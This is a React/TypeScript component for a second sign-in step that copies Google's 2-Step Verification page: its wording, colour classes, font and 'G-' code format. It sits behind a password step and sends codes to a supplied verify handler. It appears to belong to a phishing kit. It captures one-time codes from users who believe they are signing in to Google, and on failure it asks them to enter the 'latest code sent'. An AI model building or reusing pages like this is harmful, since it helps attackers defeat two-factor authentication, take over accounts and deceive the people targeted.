import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { ArrowLeft, Smartphone } from "lucide-react";

interface TwoFactorStepProps {
  onVerify: (code: string) => Promise<boolean>;
  onBack: () => void;
  onResendCode: () => void;
  firstCodeAttempt: boolean;
  email: string;
}

export function TwoFactorStep({ onVerify, onBack, onResendCode, firstCodeAttempt, email }: TwoFactorStepProps) {
  const [code, setCode] = useState("");
  const [error, setError] = useState("");
  const [isShaking, setIsShaking] = useState(false);

  // Generate masked email/phone display
  const getMaskedContact = (emailOrPhone: string) => {
    // Check if it looks like a phone number (contains only digits, spaces, dashes, parentheses)
    const phonePattern = /^[\d\s\-\(\)\+]+$/;
    
    if (phonePattern.test(emailOrPhone.replace(/\s/g, ''))) {
      // It's a phone number - show last 4 digits
      const digits = emailOrPhone.replace(/\D/g, '');
      const lastFour = digits.slice(-4);
      return `•••• •••• ${lastFour}`;
    } else {
      // It's an email - show last 4 characters before @
      const atIndex = emailOrPhone.indexOf('@');
      if (atIndex > 4) {
        const beforeAt = emailOrPhone.substring(0, atIndex);
        const lastFour = beforeAt.slice(-4);
        const domain = emailOrPhone.substring(atIndex);
        return `••••${lastFour}${domain}`;
      } else {
        // Short email, just mask most of it
        const atIndex = emailOrPhone.indexOf('@');
        const beforeAt = emailOrPhone.substring(0, atIndex);
        const domain = emailOrPhone.substring(atIndex);
        return `••••${beforeAt.slice(-1)}${domain}`;
      }
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const codeValue = code.trim();
    
    setError("");
    
    if (!codeValue) return;

    const success = await onVerify(codeValue);
    if (!success) {
      setError("Please enter latest code sent");
      setIsShaking(true);
      setTimeout(() => setIsShaking(false), 300);
      setCode("");
    }
  };

  return (
    <div>
      <div className="flex items-center mb-6">
        <button 
          data-testid="button-back-to-password"
          onClick={onBack}
          className="mr-4 p-1 hover:bg-gray-100 rounded"
        >
          <ArrowLeft className="w-5 h-5 text-google-gray" />
        </button>
      </div>

      <h1 className="text-2xl font-product-sans font-normal text-gray-800 mb-6">2-Step Verification</h1>
      
      <div className="mb-6">
        <p className="text-sm text-google-gray mb-4">
          To help keep your account safe, Google wants to make sure it's really you trying to sign in
        </p>
        
        <div className="flex items-center p-3 bg-gray-50 rounded-lg mb-4">
          <div className="w-8 h-8 bg-google-blue rounded-full flex items-center justify-center mr-3">
            <Smartphone className="w-4 h-4 text-white" />
          </div>
          <div>
            <p data-testid="text-phone-number" className="text-sm font-medium text-gray-800">
              Text message to {getMaskedContact(email)}
            </p>
            <p className="text-xs text-google-gray">Standard rates may apply</p>
          </div>
        </div>
      </div>

      <form onSubmit={handleSubmit} className="space-y-6">
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-2">
            Enter the code
          </label>
          <Input
            type="text"
            data-testid="input-verification-code"
            placeholder="G-123456"
            maxLength={8}
            value={code}
            onChange={(e) => setCode(e.target.value)}
            className={`input-field w-full px-4 py-3 border border-gray-300 rounded-md text-base focus:border-google-blue tracking-wider ${
              isShaking ? 'error-shake' : ''
            }`}
            required
          />
          {error && (
            <div data-testid="text-code-error" className="text-sm text-google-red mt-1">
              {error}
            </div>
          )}
        </div>

        <div>
          <button 
            type="button"
            data-testid="button-resend-code"
            onClick={onResendCode}
            className="text-sm text-google-blue hover:underline font-medium"
          >
            Resend code
          </button>
        </div>

        <div className="flex justify-end pt-4">
          <Button 
            type="submit"
            data-testid="button-verify"
            className="google-button bg-google-blue text-white px-6 py-2 rounded-md font-medium text-sm hover:bg-google-blue-dark"
          >
            Verify
          </Button>
        </div>
      </form>
    </div>
  );
}
